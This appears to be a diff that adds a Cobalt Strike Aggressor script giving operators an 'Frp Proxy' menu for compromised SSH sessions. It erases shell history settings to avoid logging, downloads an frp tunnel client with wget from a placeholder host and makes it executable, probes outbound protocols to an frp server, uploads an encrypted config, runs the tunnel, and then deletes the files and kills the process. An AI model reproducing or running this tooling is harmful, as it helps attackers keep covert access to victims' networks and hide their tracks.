@@ -1,0 +1,105 @@
+popup ssh {
+    menu "Frp Proxy"{
+         item "Upload" {
+            $bid = $1;
+            $dialog = dialog("upload frpc", %(local_Path => "/tmp/", Uri => "http://x/client", filename => "client", bid => $bid), &upload);
+            drow_text($dialog, "Uri",  "Uri: ");
+            drow_text($dialog, "local_Path",  "local_Path: ");
+            drow_text($dialog, "filename",  "filename: ");
+
+            dbutton_action($dialog, "ok");
+            dialog_show($dialog);
+
+        }
+
+         sub upload {
+            bshell($bid,"unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null; export HISTSIZE=0; export HISTFILESIZE=0");
+            # switch to specify path
+            bcd($bid, $3['local_Path']);
+            #bupload($bid, script_resource("/script/test.txt"));
+            bshell($bid,"wget ".$3['Uri']." -O ".$3['filename']." && chmod 777 ".$3['filename']);
+            #show_message("Download frpc");
+        }
+
+
+        item "ProbeProtocol"{
+            $bid = $1;
+            $dialog = dialog("探测出网协议", %(filename => "client", frpServer => "x.x.x.x", bid => $bid), &probeProtocol);
+            drow_text($dialog, "filename",  "filename: ");
+            drow_text($dialog, "frpServer",  "frpServer: ");
+
+            dbutton_action($dialog, "ok");
+            dialog_show($dialog);
+        }
+
+        sub probeProtocol{
+            bshell($bid,"unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null; export HISTSIZE=0; export HISTFILESIZE=0");
+            bshell($bid, "./".$3['filename']." -s ".$3['frpServer']);
+            #bsleep($bid, 5, 0);
+        }
+
+
+        item "Generate Aes Config"{
+            $bid = $1;
+            $dialog = dialog("set config", %(config => "", bid => $bid), &generate);
+            drow_text($dialog, "config",  "config: ");
+            dbutton_action($dialog, "ok");
+            dialog_show($dialog);
+        }
+
+        sub generate{
+            
+            $AESTOOL_WIN = "/script/encrypt.exe";
+            $aes_tool_win = script_resource(($AESTOOL_WIN)."");
+
+            $AESTOOL_MAC = "/script/encrypt";
+            $aes_tool_mac = script_resource(($AESTOOL_MAC)."");
+
+            $AESFILE = "/script/test.txt";
+            $aes_file = script_resource(($AESFILE)."");
+
+
+            exec($aes_tool_win ." $3['config'] $aes_file");
+            exec($aes_tool_mac ." $3['config'] $aes_file");
+
+            show_message("generate config");
+        }
+
+
+        item "Upload config"{
+            $bid = $1;
+            bupload($bid, script_resource("/script/test.txt"));
+        }
+
+
+        item "Run"{
+            $bid = $1;
+            $dialog = dialog("run frpc", %(filename => "client", bid => $bid), &run);
+            drow_text($dialog, "filename",  "filename: ");
+            dbutton_action($dialog, "ok");
+            dialog_show($dialog);
+        }
+
+        sub run{
+            bshell($bid, "./".$3['filename']);
+            #bsleep($bid, 5, 0);
+        }
+
+        item "Delete" {
+            $bid = $1;
+            $dialog = dialog("delete", %(filePath => "/tmp/", fileName => "client", bid => $bid), &delete);
+            drow_text($dialog, "filePath",  "filePath: ");
+            drow_text($dialog, "fileName",  "fileName: ");
+            dbutton_action($dialog, "ok");
+            dialog_show($dialog);
+        }
+
+        sub delete{
+            bshell($bid, "rm -rf ".$3['filePath'].$3['fileName']);
+            bshell($bid, "pkill ".$3['fileName']."$");
+        }
+
+    }
+    
+   
+}
